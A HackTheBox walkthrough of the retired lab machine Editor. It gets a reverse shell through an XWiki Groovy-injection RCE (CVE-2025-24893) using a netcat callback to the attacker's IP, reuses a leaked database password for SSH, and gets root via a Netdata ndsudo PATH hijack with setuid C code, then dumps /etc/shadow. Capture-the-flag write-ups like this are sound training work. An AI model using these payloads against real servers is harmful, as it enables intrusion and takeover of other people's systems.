---
title: Editor
summary: "Full walkthrough of the retired machine Editor from HackTheBox"
date: 2025-12-06
tag: htb-machines
permalink: /HackTheBox/Machines/Editor.md
image: /images/posts/editor_000447.png
---


![](/images/posts/editor_000447.png)

[https://app.hackthebox.com/machines/Editor](https://app.hackthebox.com/machines/Editor)

# Enumeration 
## `nmap` scan 

```bash
$nmap -sV -sC 10.10.11.80
Nmap scan report for 10.10.11.80
Host is up (0.31s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|   Server Type: Jetty(10.0.20)
|_  WebDAV type: Unknown
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## port HTTP 

- opening http://editor.htb/ display text editor program 

![](/images/posts/editor_000443.png)

- It contains a new `wiki.editor.htb` subdomain 

![](/images/posts/editor_000444.png)

- This subdomain is [XWiki](https://www.xwiki.org/)

![](/images/posts/editor_000445.png)

- The version of this XWiki is `XWiki Debian 15.10.8`

![](/images/posts/editor_000446.png)

- This version have [CVE-2025-24893](https://www.offsec.com/blog/cve-2025-24893/#:~:text=Jun%205%2C%202025-,CVE%2D2025%2D24893%20%E2%80%93%20Unauthenticated%20Remote%20Code%20Execution%20in%20XWiki%20via%20SolrSearch%20Macro,-An%20RCE%20vulnerability)
- I found public PoC  https://github.com/gunzf0x/CVE-2025-24893

```bash
$ python3 CVE-2025-24893.py -t http://wiki.editor.htb/ -c 'busybox nc 10.10.1
4.148 4444 -e /bin/bash'
[*] Attacking http://wiki.editor.htb/
[*] Injecting the payload:
http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22busybox%20nc%2010.10.14.148%204444%20-e%20/bin/bash%22.execute%28%29%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D
[*] Command executed

~Happy Hacking
```

In my listener , I got reverse shell 
# Post-Exploitation 
## shell as oliver

- There is `oliver` user 

```bash
$cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
```

- From config file `/usr/lib/xwiki-jetty/webapps/xwiki/WEB-INF/hibernate.cfg.xml` , I found a passwords

![](/images/posts/editor_35.png)

- I tried logging in via SSH using the credentials `oliver:theEd1t0rTeam99` and it worked

```bash
$ sshpass -p 'theEd1t0rTeam99' ssh oliver@10.10.11.80
oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

## Privileges escalation
- no sudo permission 

```bash
oliver@editor:~$ sudo -l
[sudo] password for oliver:
Sorry, user oliver may not run sudo on editor.
```

- In `/opt` there is interesting files 

```bash
oliver@editor:~$ ls /opt
containerd  netdata
oliver@editor:~$ ls /opt/netdata/
bin  etc  netdata-configs  netdata-dbs  netdata-logs  netdata-metrics  netdata-plugins  netdata-web-files  sbin  share  system  usr  var
```

These files is of [Netdata](https://www.netdata.cloud/) 

- This application has [CVE-2024-32019](https://sploitus.com/exploit?id=5077683C-F7E6-58BE-9375-B5A13A8782C5). I verified this by searching for the `ndsudo` command

```bash
oliver@editor:/opt/netdata$ find / -name 'ndsudo' 2>/dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo

oliver@editor:/opt/netdata$ ls -al /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
-rwsr-x--- 1 root netdata 200576 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo

oliver@editor:/opt/netdata$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo --help

ndsudo

(C) Netdata Inc.

A helper to allow Netdata run privileged commands.

  --test
    print the generated command that will be run, without running it.

  --help
    print this message.

The following commands are supported:

- Command    : nvme-list
  Executables: nvme
  Parameters : list --output-format=json

- Command    : nvme-smart-log
  Executables: nvme
  Parameters : smart-log {{device}} --output-format=json

- Command    : megacli-disk-info
  Executables: megacli MegaCli
  Parameters : -LDPDInfo -aAll -NoLog

- Command    : megacli-battery-info
  Executables: megacli MegaCli
  Parameters : -AdpBbuCmd -aAll -NoLog

- Command    : arcconf-ld-info
  Executables: arcconf
  Parameters : GETCONFIG 1 LD

- Command    : arcconf-pd-info
  Executables: arcconf
  Parameters : GETCONFIG 1 PD

The program searches for executables in the system path.

Variables given as {{variable}} are expected on the command line as:
  --variable VALUE

VALUE can include space, A-Z, a-z, 0-9, _, -, /, and .
```

>[!info] 
>**CVE-2024-32019** is a local privilege escalation vulnerability in Netdata’s `ndsudo` binary, which is installed SUID-root. The flaw comes from `ndsudo` using the user-controlled `PATH` environment variable to locate system commands. An unprivileged attacker can create a malicious executable with the same name as one of the commands that `ndsudo` is allowed to run (like nvme) , place it in a directory they control, and set their `PATH` so this directory is searched first. When the attacker runs `ndsudo`, the program unknowingly executes the malicious binary with root privileges, resulting in full system compromise. Upgrading Netdata to version 1.45.3 or later prevents this issue.

- I compiled the malicious binary 

```bash
$cat exploit.c

#include <unistd.h>

int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}


$ gcc exploit.c -o nvme
```

- I uploaded this binary file to the compromised host 

```bash
$ scp nvme oliver@10.10.11.80:/tmp/
oliver@10.10.11.80's password:
nvme                                                                          100%   16KB   0.4KB/s   00:38
```

- Set new PATH then Execute `ndsudo` command

```bash
oliver@editor:/tmp$ chmod +x /tmp/nvme 
oliver@editor:/tmp$ export PATH=/tmp:$PATH

oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
root@editor:/tmp# id
uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(oliver)

root@editor:/tmp# cat /etc/shadow
root:$y$j9T$l1.MaTIpHzTAduIC4EoaA/$rNvK9Vq.iBxZ3BXRP4SM2CtSkVYdVnr5XrWQvMzLx99:20258:0:99999:7:::
daemon:*:19405:0:99999:7:::
bin:*:19405:0:99999:7:::
sys:*:19405:0:99999:7:::

...<SNIP>...

tomcat:!*:20252::::::
xwiki:!*:20252::::::
netdata:!:20254::::::
oliver:$y$j9T$ktpLdRnocjXX8B2lat/6g.$/RNnDVRsMc0KybbsLVuJhxX9FgtjNMmPqvdYRaHOqu/:20258:0:99999:7:::
_laurel:!:20270::::::
```
